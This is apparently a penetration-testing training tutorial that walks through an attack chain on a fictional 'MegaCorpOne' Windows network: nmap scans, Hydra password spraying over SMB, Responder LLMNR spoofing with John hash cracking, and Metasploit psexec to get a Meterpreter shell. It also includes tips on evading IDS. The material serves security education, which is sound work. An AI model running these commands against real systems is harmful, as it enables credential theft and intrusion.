## Differences Between Windows and Linux Penetration Testing

While penetration testing principles remain the same, the tools and techniques differ between Windows and Linux environments due to their architecture, protocols, and security mechanisms.

### Key Differences

| Aspect                | Windows                                | Linux                                  |
|-----------------------|----------------------------------------|----------------------------------------|
| **File System**       | NTFS, uses drive letters (e.g., `C:\`) | Ext4, hierarchical directory structure |
| **Authentication**    | Active Directory (Kerberos, NTLM)     | PAM, SSH                               |
| **Common Tools**      | PowerShell, Metasploit, Mimikatz       | Bash, Metasploit, Hydra                |
| **Open Ports**        | SMB (445), RDP (3389), WMI            | SSH (22), HTTP (80/443)                |
| **Exploitation**      | Focus on Active Directory and SMB      | Focus on SSH and web services          |

### Example
- **Windows**: Exploiting SMB vulnerabilities (e.g., EternalBlue).
- **Linux**: Exploiting weak SSH credentials or misconfigured web servers.

## Common Open Ports on a Windows Machine

Windows machines often have specific ports open for various services. These ports can be targeted during penetration testing.

### Common Ports and Their Services

| Port  | Service                     | Description                                      |
|-------|-----------------------------|--------------------------------------------------|
| 135   | RPC (Remote Procedure Call) | Used for inter-process communication.           |
| 139   | NetBIOS                     | Provides file and printer sharing services.     |
| 445   | SMB (Server Message Block)  | Used for file sharing and network communication.|
| 3389  | RDP (Remote Desktop Protocol)| Allows remote desktop connections.              |
| 5985  | WinRM (Windows Remote Management) | Used for remote management via PowerShell. |

### Example: Scanning for Open Ports
- **Command**:
  ```bash
  nmap -p 135,139,445,3389 <target-ip>
  ```
- **Output**:
  ```plaintext
  PORT     STATE SERVICE
  135/tcp  open  msrpc
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  3389/tcp open  ms-wbt-server
  ```

## Port Scanning: Updated Example

### Scenario
You are conducting a follow-up scan on MegaCorpOne's network to identify any new Windows machines or services.

### Example: Comprehensive Port Scan
1. **Command**:
   ```bash
   nmap -sS -p- <target-ip>
   ```
2. **Explanation**:
   - `-sS`: Performs a stealth SYN scan.
   - `-p-`: Scans all 65,535 ports.
3. **Output**:
   ```plaintext
   PORT     STATE SERVICE
   135/tcp  open  msrpc
   139/tcp  open  netbios-ssn
   445/tcp  open  microsoft-ds
   3389/tcp open  ms-wbt-server
   5985/tcp open  wsman
   ```
4. **Use Case**:
   - Identify new services or machines added to the network since the last scan.

## Password Spraying: Updated Example

### Scenario
You previously cracked several passwords from a Linux machine. Now, you will attempt to use those credentials to log in to a Windows machine.

### Example: Password Spraying
1. **Tool**: Hydra
2. **Command**:
   ```bash
   hydra -L usernames.txt -P cracked_passwords.txt <target-ip> smb
   ```
3. **Explanation**:
   - `-L usernames.txt`: Specifies a file containing usernames.
   - `-P cracked_passwords.txt`: Specifies a file containing cracked passwords.
   - `smb`: Specifies the SMB protocol.
4. **Output**:
   ```plaintext
   [445][smb] host: 192.168.1.10   login: jdoe   password: Password123
   ```
5. **Use Case**:
   - Identify valid credentials for accessing the Windows machine.

## LLMNR Spoofing: Updated Example

### Scenario
You will perform LLMNR spoofing to capture credentials for another domain user and crack them offline.

### Example: LLMNR Spoofing
1. **Tool**: Responder
2. **Steps**:
   - Start Responder:
     ```bash
     responder -I eth0
     ```
   - Wait for a victim to send an LLMNR request.
   - Capture the NTLMv2 hash.

3. **Crack the Hash**:
   - Use John the Ripper to crack the captured hash:
     ```bash
     john --format=ntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
     ```
4. **Output**:
   ```plaintext
   jdoe:Password123
   ```
5. **Use Case**:
   - Obtain valid credentials for further exploitation.

## Windows Exploitation: Updated Example

### Scenario
You will use the credentials obtained from LLMNR spoofing to exploit a Windows machine and execute commands remotely.

### Example: Exploiting a Windows Machine
1. **Tool**: Metasploit
2. **Steps**:
   - Start Metasploit:
     ```bash
     msfconsole
     ```
   - Use the psexec module:
     ```plaintext
     use exploit/windows/smb/psexec
     ```
   - Set the target and credentials:
     ```plaintext
     set RHOSTS <target-ip>
     set SMBUser jdoe
     set SMBPass Password123
     ```
   - Launch the exploit:
     ```plaintext
     exploit
     ```
3. **Outcome**:
   - Gain a Meterpreter session on the target machine.
   - Example command:
     ```plaintext
     meterpreter > sysinfo
     ```
   - Output:
     ```plaintext
     Computer        : WIN-MEGA01
     OS              : Windows 10 (Build 19041).
     ```

## Security Considerations

- **Port Scanning**: Use stealth techniques to avoid detection by intrusion detection systems (IDS).
- **Password Spraying**: Limit attempts to avoid account lockouts.
- **LLMNR Spoofing**: Ensure ethical use and avoid disrupting legitimate network traffic.
- **Exploitation**: Always obtain written permission before exploiting vulnerabilities.
